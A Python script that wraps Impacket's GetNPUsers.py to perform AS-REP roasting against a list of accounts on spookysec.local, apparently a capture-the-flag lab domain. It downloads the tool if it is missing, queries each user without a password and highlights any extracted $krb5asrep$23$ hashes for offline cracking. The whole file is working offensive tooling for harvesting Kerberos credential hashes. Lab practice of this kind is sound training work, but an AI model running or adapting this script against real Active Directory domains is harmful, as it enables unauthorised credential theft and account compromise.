#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Check_GETNPUsers.py
Cleaner Python version that runs GetNPUsers.py (downloads if missing),
filters noisy banner/warning lines and highlights $krb5asrep$23$ tokens.
"""

import os
import sys
import subprocess
import argparse
import shutil
import re
from urllib.request import urlretrieve

# ANSI colors
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
CYAN = "\033[36m"
BOLD = "\033[1m"
RESET = "\033[0m"

DOWNLOAD_URL = "https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetNPUsers.py"
DEFAULT_DOMAIN = "spookysec.local"
EXTRA_FLAGS = "-no-pass"
DEFAULT_USERS = [
    "james@spookysec.local",
    "svc-admin@spookysec.local",
    "James@spookysec.local",
    "robin@spookysec.local",
    "darkstar@spookysec.local",
    "administrator@spookysec.local",
    "backup@spookysec.local",
    "paradox@spookysec.local",
    "Robin@spookysec.local",
    "Administrator@spookysec.local",
]

# patterns to filter out completely (noisy lines)
NOISE_PATTERNS = [
    re.compile(r"__import__\('pkg_resources'\).*run_script", re.IGNORECASE),
    re.compile(r"^Impacket\s+v", re.IGNORECASE),
    re.compile(r"DeprecationWarning", re.IGNORECASE),
    re.compile(r"Copyright", re.IGNORECASE),
]

# patterns that indicate success/AS-REP/etc (case-insensitive)
DETECT_PATTERNS = [
    r"\$krb5asrep\$23\$",
    r"getting its tgt",
    r"getting tgt",
    r"got tgt",
    r"cannot authenticate .* getting its tgt",
    r"as-rep",
    r"krb5asrep",
    r"ntlm",
    r"hash",
    r"ticket",
]


def download_getnp(dest):
    print(f"{CYAN}[i] Downloading GetNPUsers.py -> {dest}{RESET}")
    try:
        urlretrieve(DOWNLOAD_URL, dest)
        os.chmod(dest, 0o755)
    except Exception as e:
        print(f"{RED}[!] Failed to download GetNPUsers.py: {e}{RESET}")
        sys.exit(1)


def find_or_download_getnp(provided_path=None):
    # honor explicit path first
    if provided_path:
        if os.path.isfile(provided_path):
            return provided_path
        else:
            print(f"{YELLOW}[!] Provided GetNPUsers path not found: {provided_path}{RESET}")
    candidates = [
        "./GetNPUsers.py",
        "/usr/local/bin/GetNPUsers.py",
        "/usr/bin/GetNPUsers.py",
    ]
    for p in candidates:
        if os.path.isfile(p):
            return p
    # try on PATH
    exe = shutil.which("GetNPUsers.py")
    if exe:
        return exe
    # else download to current dir
    dest = "./GetNPUsers.py"
    download_getnp(dest)
    return dest


def clean_output(raw):
    """
    Remove noisy lines from tool output and return cleaned string.
    Also strips leading/trailing blank lines.
    """
    lines = raw.splitlines()
    cleaned = []
    for ln in lines:
        # strip only common leading/trailing whitespace; keep indentation inside messages
        s = ln.rstrip("\r\n")
        # skip empty lines that are excessive — keep single blank where useful
        skip = False
        for pat in NOISE_PATTERNS:
            if pat.search(s):
                skip = True
                break
        if skip:
            continue
        # otherwise keep
        cleaned.append(s)
    # remove leading/trailing blank lines
    while cleaned and cleaned[0].strip() == "":
        cleaned.pop(0)
    while cleaned and cleaned[-1].strip() == "":
        cleaned.pop()
    return "\n".join(cleaned)


def run_getnp(getnp_path, target, extra_flags):
    cmd = ["python3", getnp_path, target] + (extra_flags.split() if extra_flags else [])
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        out = proc.stdout + proc.stderr
    except subprocess.TimeoutExpired:
        return "[!] GetNPUsers timed out"
    return clean_output(out)


def has_any_pattern(text, patterns):
    txt = text.lower()
    for p in patterns:
        if p.lower() in txt:
            return True
    return False


def extract_krb5_tokens(text):
    # return list of full $krb5asrep$23$... tokens found
    tokens = re.findall(r"(\$krb5asrep\$23\$[^\s']+)", text, flags=re.IGNORECASE)
    return tokens


def short_preview(text, n=12):
    lines = text.splitlines()
    return "\n".join(lines[:n])


def main():
    parser = argparse.ArgumentParser(description="Cleaner GetNPUsers batch runner (Python)")
    parser.add_argument("--getnp", help="Path to GetNPUsers.py")
    parser.add_argument("--domain", default=DEFAULT_DOMAIN, help="Target domain")
    parser.add_argument("--users-file", help="File with username@domain lines")
    parser.add_argument("--extra-flags", default=EXTRA_FLAGS, help="Extra flags to pass to GetNPUsers.py")
    parser.add_argument("--success-color", default="green", choices=["green", "red"], help="Color to use for success output")
    args = parser.parse_args()

    ok_color = GREEN if args.success_color == "green" else RED

    getnp_path = find_or_download_getnp(args.getnp)
    print(f"{CYAN}[i] Using GetNPUsers: {getnp_path}{RESET}")

    # Load users
    if args.users_file:
        if not os.path.isfile(args.users_file):
            print(f"{RED}[!] Users file not found: {args.users_file}{RESET}")
            sys.exit(1)
        with open(args.users_file, "r", encoding="utf-8") as f:
            users = [line.strip() for line in f if line.strip()]
    else:
        users = DEFAULT_USERS

    print(f"{BOLD}{CYAN}[*] Running GetNPUsers for {len(users)} accounts (domain: {args.domain}){RESET}")

    for u in users:
        username_only = u.split("@")[0] if "@" in u else u
        target = f"{args.domain}/{username_only}"
        print()
        print(f"{CYAN}[+] Running: python3 {getnp_path} {target} {args.extra_flags}{RESET}")
        raw = run_getnp(getnp_path, target, args.extra_flags)
        print(f"{YELLOW}---- preview ----{RESET}")
        print(short_preview(raw, n=12))
        print(f"{YELLOW}-----------------{RESET}")

        # check for full tokens first
        tokens = extract_krb5_tokens(raw)
        if tokens:
            print(f"{ok_color}{BOLD}*** KRB5 AS-REP HASH FOUND for {u} ***{RESET}")
            for t in tokens:
                print(f"{ok_color}{t}{RESET}")
            # also print contextual lines that match detection patterns
            for line in raw.splitlines():
                if has_any_pattern(line, DETECT_PATTERNS):
                    print(f"{ok_color}{line}{RESET}")
            continue

        # else search for other indicators
        if has_any_pattern(raw, DETECT_PATTERNS):
            print(f"{ok_color}{BOLD}*** INDICATOR FOUND for {u} ***{RESET}")
            for line in raw.splitlines():
                if has_any_pattern(line, DETECT_PATTERNS):
                    print(f"{ok_color}{line}{RESET}")
        else:
            print(f"{CYAN}[ ] No indicator for {u}{RESET}")

    print(f"\n{BOLD}{GREEN}[*] Done.{RESET} All checks completed.")


if __name__ == "__main__":
    main()
